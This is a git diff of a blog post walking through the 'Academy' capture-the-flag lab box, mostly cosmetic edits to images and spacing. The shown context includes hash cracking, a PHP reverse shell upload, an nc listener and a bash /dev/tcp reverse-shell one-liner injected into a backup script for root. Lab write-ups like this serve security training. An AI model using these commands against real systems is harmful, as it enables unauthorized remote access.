@@ -18,7 +18,7 @@ header:
   image: /assets/images/tcm-academy/academy-header-image.png
   caption: "Navigating the Digital Labyrinth: A Journey Through Ethical Hacking"
   teaser: /assets/images/tcm-academy/academy-teaser.png
-  overlay_image: /assets/images/tcm-academy/academy-overlay-pattern.svg
+  overlay_image: /assets/images/tcm-academy/academy-overlay-pattern.png
   overlay_filter: rgba(0, 0, 0, 0.5)
 ---
 
@@ -33,17 +33,9 @@ In this blog post, I'll walk you through the process of rooting the Academy box 
 4. File upload vulnerability in student profile section
 5. Privilege escalation through periodic backup script
 
-### Network Topology
+### Diagram
 
-```mermaid
-graph TD
-    A[Attacker Machine] -->|Port 21| B[Target: Academy Box]
-    A -->|Port 80| B
-    A -->|Port 22| B
-    B -->|Web App| C[Student Portal]
-    C -->|File Upload| D[PHP Shell]
-    D -->|Privilege Escalation| E[Root Access]
-```
+<img src="/assets/images/tcm-academy/academy-network-diagram.png">
 
 ## Initial Enumeration
 
@@ -81,6 +73,8 @@ cat note.txt
 ```
 
 <img src="/assets/images/tcm-academy/academy-04.png">
+
+
 <img src="/assets/images/tcm-academy/academy-05.png">
 
 The note contained information about a student registration database and included a password hash. Using hash-identifier, I determined it was MD5:
@@ -99,11 +93,19 @@ hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
 <img src="/assets/images/tcm-academy/academy-07.png">
+
+
 <img src="/assets/images/tcm-academy/academy-08.png">
 
 ## Web Application Discovery
 
-Initial web server check revealed a default Apache page. Moving to directory enumeration:
+Initial web server check revealed a default Apache page. 
+
+<img src="/assets/images/tcm-academy/academy-09.png">
+
+Moving to directory enumeration:
+
+
 
 ```bash
 http://192.168.17.136/robots.txt
@@ -126,6 +128,8 @@ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u htt
 ```
 
 <img src="/assets/images/tcm-academy/academy-10.png">
+
+
 <img src="/assets/images/tcm-academy/academy-11.png">
 
 Two interesting paths were discovered:
@@ -137,6 +141,8 @@ Two interesting paths were discovered:
 Using the previously obtained credentials on the academy login page:
 
 <img src="/assets/images/tcm-academy/academy-12.png">
+
+
 <img src="/assets/images/tcm-academy/academy-12-student.png">
 
 ## Exploiting File Upload
@@ -152,13 +158,16 @@ Testing confirmed uploads were stored at:
 
 <img src="/assets/images/tcm-academy/academy-14.png">
 
-Preparing the PHP reverse shell:
+Preparing the PHP reverse shell, borrowing one from Pentestmonkey: http://https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+
 
 ```bash
 nano reverse-shell.php
 ```
 
 <img src="/assets/images/tcm-academy/academy-15.png">
+
+
 <img src="/assets/images/tcm-academy/academy-16.png">
 
 Setting up the listener:
@@ -172,6 +181,8 @@ nc -nvlp 1234
 Uploading and executing the shell:
 
 <img src="/assets/images/tcm-academy/academy-18.png">
+
+
 <img src="/assets/images/tcm-academy/academy-19.png">
 
 ## Privilege Escalation
@@ -194,9 +205,17 @@ LINPEAS revealed several interesting findings:
 - User "grimmie" with elevated privileges
 
 <img src="/assets/images/tcm-academy/academy-23.png">
+
+
 <img src="/assets/images/tcm-academy/academy-24.png">
+
+
 <img src="/assets/images/tcm-academy/academy-25.png">
+
+
 <img src="/assets/images/tcm-academy/academy-26.png">
+
+
 <img src="/assets/images/tcm-academy/academy-27.png">
 
 Using the discovered credentials for SSH access:
@@ -218,6 +237,8 @@ cat backup.sh
 ```
 
 <img src="/assets/images/tcm-academy/academy-29.png">
+
+
 <img src="/assets/images/tcm-academy/academy-30.png">
 
 Using pspy to monitor processes:
@@ -229,7 +250,11 @@ chmod +x pspy64
 ```
 
 <img src="/assets/images/tcm-academy/academy-35.png">
+
+
 <img src="/assets/images/tcm-academy/academy-36.png">
+
+
 <img src="/assets/images/tcm-academy/academy-37.png">
 
 ## Root Access
@@ -243,6 +268,8 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 ```
 
 <img src="/assets/images/tcm-academy/academy-39-1.png">
+
+
 <img src="/assets/images/tcm-academy/academy-39-2.png">
 
 Waiting for script execution to gain root:
@@ -250,6 +277,8 @@ Waiting for script execution to gain root:
 <img src="/assets/images/tcm-academy/academy-40.png">
 
 ## Success - Root Access Achieved
+
+Finally, I captured the flag from the /root directory:
 
 ```bash
 whoami
